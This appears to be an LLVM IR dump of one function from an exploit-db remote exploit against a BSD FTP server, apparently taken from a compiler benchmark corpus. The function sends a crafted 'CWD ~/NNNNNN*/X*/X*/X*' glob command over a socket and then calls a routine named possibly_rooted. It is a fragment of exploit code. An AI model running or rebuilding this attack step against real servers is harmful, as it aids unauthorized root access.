; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_20731.c_send_glob.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_20731.c_send_glob.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.send_glob.globbed = private unnamed_addr constant [24 x i8] c"CWD ~/NNNNNN*/X*/X*/X*\0A\00", align 16
@.str = private unnamed_addr constant [28 x i8] c"[5] Globbed commands sent.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @send_glob(i32 %0, i8* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca [24 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %8 = bitcast [24 x i8]* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %8, i8* align 16 getelementptr inbounds ([24 x i8], [24 x i8]* @__const.send_glob.globbed, i32 0, i32 0), i64 24, i1 false)
  store i32 6, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %9

9:                                                ; preds = %21, %2
  %10 = load i32, i32* %6, align 4
  %11 = icmp slt i32 %10, 12
  br i1 %11, label %12, label %26

12:                                               ; preds = %9
  %13 = load i8*, i8** %4, align 8
  %14 = load i32, i32* %7, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = load i32, i32* %6, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [24 x i8], [24 x i8]* %5, i64 0, i64 %19
  store i8 %17, i8* %20, align 1
  br label %21

21:                                               ; preds = %12
  %22 = load i32, i32* %6, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %6, align 4
  %24 = load i32, i32* %7, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %7, align 4
  br label %9

26:                                               ; preds = %9
  %27 = load i32, i32* %3, align 4
  %28 = getelementptr inbounds [24 x i8], [24 x i8]* %5, i64 0, i64 0
  %29 = call i32 @write_sock(i32 %27, i8* %28)
  %30 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str, i64 0, i64 0))
  %31 = load i8*, i8** %4, align 8
  %32 = call i32 @free(i8* %31)
  %33 = load i32, i32* %3, align 4
  %34 = call i32 @possibly_rooted(i32 %33)
  ret void
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @write_sock(i32, i8*) #2

declare dso_local i32 @printf(i8*) #2

declare dso_local i32 @free(i8*) #2

declare dso_local i32 @possibly_rooted(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
